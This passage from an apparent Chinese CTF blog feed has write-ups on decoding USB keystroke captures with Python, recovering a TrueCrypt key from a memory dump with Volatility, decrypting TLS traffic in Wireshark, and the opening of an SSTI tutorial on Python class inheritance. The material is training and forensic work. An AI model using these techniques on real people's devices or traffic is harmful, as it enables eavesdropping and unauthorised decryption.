&quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(&#x27;usbdata.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    #print(line)</span><br><span class=\"line\">    if len(line)!=17: #首先过滤掉鼠标等其他设备的USB流量</span><br><span class=\"line\">         continue</span><br><span class=\"line\">    nums.append(line[0:2]+line[4:6]) #取一、三字节</span><br><span class=\"line\">    #print(nums)</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\">output = &quot;&quot;</span><br><span class=\"line\">for n in nums:</span><br><span class=\"line\">    if n[2:4] == &quot;00&quot; :</span><br><span class=\"line\">        continue</span><br><span class=\"line\"></span><br><span class=\"line\">    if n[2:4] in normalKeys:</span><br><span class=\"line\">        if n[0:2]==&quot;02&quot;: #表示按下了shift</span><br><span class=\"line\">            output += shiftKeys [n[2:4]]</span><br><span class=\"line\">        else :</span><br><span class=\"line\">            output += normalKeys [n[2:4]]</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        output += &#x27;[unknown]&#x27;</span><br><span class=\"line\">print(&#x27;output :&#x27; + output)</span><br></pre></td></tr></table></figure>\n<p>得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YSwXyswom6ICBpyL.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h3 id=\"二\"><a class=\"markdownIt-Anchor\" href=\"#二\">#</a> 二</h3>\n<p>当然也可以和鼠标流量一样用脚本先把多余的剔除并且删除空行并使用冒号分隔</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure>\n<p>同样输入路径，16<br>\n 得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UExxnxQdQ98AhqGI.png!thumbnail\" alt=\"\"></p>\n<p>接着利用脚本对照转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">output = []</span><br><span class=\"line\">keys = open(&#x27;out1.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:</span><br><span class=\"line\">             continue</span><br><span class=\"line\">        if line[6:8] in normalKeys.keys():</span><br><span class=\"line\">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            output += [&#x27;[unknown]&#x27;]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\"></span><br><span class=\"line\">flag=0</span><br><span class=\"line\">print(&quot;&quot;.join(output))</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        a=output.index(&#x27;&lt;DEL&gt;&#x27;)</span><br><span class=\"line\">        del output[a]</span><br><span class=\"line\">        del output[a-1]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if output[i]==&quot;&lt;CAP&gt;&quot;:</span><br><span class=\"line\">            flag+=1</span><br><span class=\"line\">            output.pop(i)</span><br><span class=\"line\">            if flag==2:</span><br><span class=\"line\">                flag=0</span><br><span class=\"line\">        if flag!=0:</span><br><span class=\"line\">            output[i]=output[i].upper()</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">print (&#x27;output :&#x27; + &quot;&quot;.join(output))</span><br></pre></td></tr></table></figure>\n<p>得到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fWB6zzlzqpbQMUS.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/TrueCrypt%E8%A7%A3%E5%AF%86/",
            "url": "https://nnnpc.github.io/2024/04/16/TrueCrypt%E8%A7%A3%E5%AF%86/",
            "title": "TrueCrypt解密",
            "date_published": "2024-04-16T05:58:19.036Z",
            "content_html": "<h1 id=\"truecrypt解密\"><a class=\"markdownIt-Anchor\" href=\"#truecrypt解密\">#</a> TrueCrypt 解密</h1>\n<p>最近做到了一道 TrueCrypt 加密镜像的题目，这里用两种方法来解密记录一下</p>\n<h2 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一：</h2>\n<p>Passware 一把梭</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128194137537.png\" alt=\"\"></p>\n<p>成功解密之后的文件会被输出到指定目录当中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128194328949.png\" alt=\"\"></p>\n<p>添加后缀为 img，导入 DG</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128194446760.png\" alt=\"\"></p>\n<p>在主分区中能够找到机密文档，打开获得 flag</p>\n<h2 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二：</h2>\n<p>这道题目给出的文件有 TrueCrypt 加密的 sec 文件和内存文件 sec.raw，可以先使用 vol2 对内存文件进行取证拿到密钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f sec.raw imageinfo</span><br><span class=\"line\"></span><br><span class=\"line\">.\\volatility_2.6_win64_standalone.exe -f sec.raw --profile=Win7SP1x64 truecryptmaster Recover</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128195025089.png\" alt=\"\"></p>\n<p>这里我是直接手撕出来了，添上后缀.key</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FtTmU1aUEvTUtEZWNyeXB0\">https://github.com/AmNe5iA/MKDecrypt</span></p>\n<p>利用该 github 的项目能够直接实现解密并且自动挂载到 kali</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir mount</span><br><span class=\"line\"></span><br><span class=\"line\">sudo python3 MKDecrypt.py -v -X -r -m mount sec 1.key</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128195651952.png\" alt=\"\"></p>\n<p>挂载完成后，去文件夹中便能找到机密文档</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231128195822063.png\" alt=\"\"></p>\n<p>这里使用完记得按 enter 取消挂载，如果使用了错误的退出方式例如 ctrl +<br>\nc，请使用以下方法进行移除</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo umount /dev/mapper/MKDecrypt1</span><br><span class=\"line\"></span><br><span class=\"line\">sudo dmsetup remove MKDecrypt1</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/TLS%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "url": "https://nnnpc.github.io/2024/04/16/TLS%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/",
            "title": "TLS流量解密",
            "date_published": "2024-04-16T05:58:19.035Z",
            "content_html": "<p>原题来源：BUUCTF greatescape<br>\n 本题考察的是一个数据包的 TLS 流解密，记录一下<br>\n下载附件，解压下来一个流量包，用 wireshark 进行查看</p>\n<p>查看下协议分级，能看到 TCP、TLS 协议，所以猜测是 TLS 流量解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/04as4ZLypn1OgVBR.png!thumbnail\" alt=\"\"></p>\n<p>如果是 TLS，那么一定会有私钥需要给出进行解密，查看下 tcp 追踪流，在流 18 的时候发现</p>\n<p>有个 ssc.key</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IhQwxHp4ircr3Cbe.png!thumbnail\" alt=\"\"></p>\n<p>更加确定了 TLS 流解密的猜想，下一个流 19，便是我们要找的私钥文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gGzRQ0Pmba3Uq39A.png!thumbnail\" alt=\"\"></p>\n<p>保存为 ssc.key，在编辑 -&gt; 首选项 -&gt;Protocols-&gt;TLS 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ogGhLSU2hu0zlRng.png!thumbnail\" alt=\"\"></p>\n<p>找到 edit，导入我们的 key</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XNHe44Hs1axllQyO.png!thumbnail\" alt=\"\"></p>\n<p>前面是路径，这里直接点击找到文件便能生成，确定之后查看能导出的 http 对象，很明显地发现能导出的对象变多了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/v4Amvap0MoL8GIf9.png!thumbnail\" alt=\"\"></p>\n<p>试试用关键字搜索 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http contains FLAG</span><br></pre></td></tr></table></figure>\n<p>找到 flag<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9wlCpVN9QVFgWiOX.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p OkThatWasWay2Easy=\"\">FLAG: INS</p>\n<p>包上 flag 为：<strong>flag{OkThatWasWay2Easy}</strong></p>\n",
            "tags": [
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/",
            "url": "https://nnnpc.github.io/2024/04/16/SSTI%E5%AD%A6%E4%B9%A0/",
            "title": "SSTI学习",
            "date_published": "2024-04-16T05:58:19.033Z",
            "content_html": "<h1 id=\"ssti学习\"><a class=\"markdownIt-Anchor\" href=\"#ssti学习\">#</a> SSTI 学习</h1>\n<p>SSTI (Server-Side Template Injection) 又称服务器端模板注入</p>\n<p>用户的输入先进入 Controller 控制器，然后根据请求类型和请求的指令发送给对应 Model 业务模型进行业务逻辑判断，数据库存取，最后把结果返回给 View 视图层，经过模板渲染展示给用户</p>\n<p>模板通俗来讲就是拥有一个固定的格式，等着进行填充</p>\n<h2 id=\"漏洞原理\"><a class=\"markdownIt-Anchor\" href=\"#漏洞原理\">#</a> 漏洞原理</h2>\n<p>服务端在接收到用户的输入之后，并未做出有效的处理而导致用户可以输入一些攻击语句让模板引擎进行编译渲染，执行了攻击语句，从而达到了攻击者需要的效果</p>\n<h2 id=\"继承关系\"><a class=\"markdownIt-Anchor\" href=\"#继承关系\">#</a> 继承关系</h2>\n<p>接下来说说该漏洞点该如何进行利用，最主要的就是搞清楚继承的关系，接着就是绕过。因此，搞清楚继承关系对后续的注入有很大的帮助</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class A:</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class B(A):</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class C(B):</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">class D(C):</span><br><span class=\"line\"></span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">f = C()</span><br><span class=\"line\"></span><br><span class=\"line\">print(f)</span><br></pre></td></tr></table></figure>\n<p>这里 B 继承了 A，C 又继承了 B，以次类推，并且创建了 C 的对象 f，这里介绍第一个魔术方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__)</span><br></pre></td></tr></table></figure>\n<p>该魔术方法可以用来找到该对象当前所在的类</p>\n<p>接下来返回到它的父类也就是 B，所用的魔术方法为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__base__)</span><br></pre></td></tr></table></figure>\n<p>当然，如果想再返回 B 的父类也就是 A，再跟上一个 base 即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__base__.__base__)</span><br></pre></td></tr></table></figure>\n<p>那么疑问来了，在这里 A 并没有被设定成谁的子类，如果再返回他的父类会到哪呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(f.__class__.__base__.__base__.__base__)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231205150431556.png\" alt=\"\"></p>\n<p>发现 A 类的父类是 object 类，当一个类没有显式指定它是继承某个类的时候，它就会默认继承 object 类</p>\n<p>在这里能看到从一个子类到父类的过程是用 base 魔术方法，但这样比较冗长，可以直接使用 mro 魔术方法来列出所有父类</p>\n<figure class=\"highlight plaintext\"><table><tr><td 